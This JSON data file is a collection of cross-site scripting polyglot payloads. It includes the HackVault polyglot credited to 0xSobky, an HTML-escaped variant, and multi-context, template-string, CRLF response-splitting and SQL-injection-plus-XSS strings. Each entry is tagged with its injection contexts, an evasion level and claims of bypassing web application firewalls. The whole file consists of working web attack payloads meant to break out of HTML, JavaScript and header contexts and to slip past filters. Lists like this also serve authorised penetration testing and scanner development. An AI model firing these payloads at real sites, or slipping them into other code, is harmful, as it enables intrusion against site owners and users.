{
  "category": "ultimate_polyglots",
  "description": "Ultimate XSS polyglots that work across multiple contexts - from HackVault and advanced research",
  "difficulty": "god_tier_ultimate",
  "payloads": [
    {
      "name": "hackvault_ultimate_polyglot",
      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
      "description": "Ultimate 144-character polyglot working in HTML, JS, CSS, and more contexts",
      "context": ["html_quoted", "html_unquoted", "javascript_string", "css", "regex", "comment", "href", "src", "innerHTML", "eval"],
      "encoding": "mixed",
      "evasion_level": 10,
      "waf_bypass": ["all"],
      "length": 144,
      "creator": "0xSobky",
      "source": "HackVault"
    },
    {
      "name": "hackvault_html_escaped",
      "payload": "jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e",
      "description": "HTML-escaped version of ultimate polyglot for innerHTML/outerHTML contexts",
      "context": ["innerHTML", "outerHTML", "document_write", "html_escaped"],
      "encoding": "html_escaped",
      "evasion_level": 10,
      "waf_bypass": ["all"],
      "creator": "0xSobky",
      "source": "HackVault"
    },
    {
      "name": "multi_context_breaker",
      "payload": "'\"><img src=x onerror=alert(1)></script><script>alert(1)</script><svg onload=alert(1)><!--",
      "description": "Multi-context breaker for attributes, scripts, and HTML",
      "context": ["html_quoted", "html_unquoted", "script_context", "svg"],
      "encoding": "none",
      "evasion_level": 8,
      "waf_bypass": ["basic", "generic"]
    },
    {
      "name": "filter_evasion_polyglot",
      "payload": "jaVasCrIpT:/**/oNcLiCk=/**/aLeRt(/**/1/**/)",
      "description": "Case variation and comment-based filter evasion polyglot",
      "context": ["href", "src", "event_handler"],
      "encoding": "case_variation",
      "evasion_level": 7,
      "waf_bypass": ["regex_filters", "case_sensitive"]
    },
    {
      "name": "template_string_polyglot",
      "payload": "`${alert(1)}`'><script>alert(1)</script>",
      "description": "Template string execution with HTML context breaking",
      "context": ["template_string", "html_quoted", "script_context"],
      "encoding": "none",
      "evasion_level": 8,
      "waf_bypass": ["template_detection", "basic"]
    },
    {
      "name": "crlf_injection_polyglot",
      "payload": "x%0D%0ASet-Cookie:xss=1%0D%0A%0D%0A<script>alert(1)</script>",
      "description": "CRLF injection with XSS payload for HTTP response splitting",
      "context": ["http_header", "crlf_injection", "html"],
      "encoding": "url_encoded",
      "evasion_level": 9,
      "waf_bypass": ["header_filters", "crlf_protection"]
    },
    {
      "name": "sql_xss_polyglot",
      "payload": "' OR 1=1 UNION SELECT '<script>alert(1)</script>'--",
      "description": "SQL injection with XSS payload for error-based reflections",
      "context": ["sql_injection", "error_messages", "html"],
      "encoding": "none",
      "evasion_level": 9,
      "waf_bypass": ["sql_filters", "error_suppression"]
    }
  ]
}
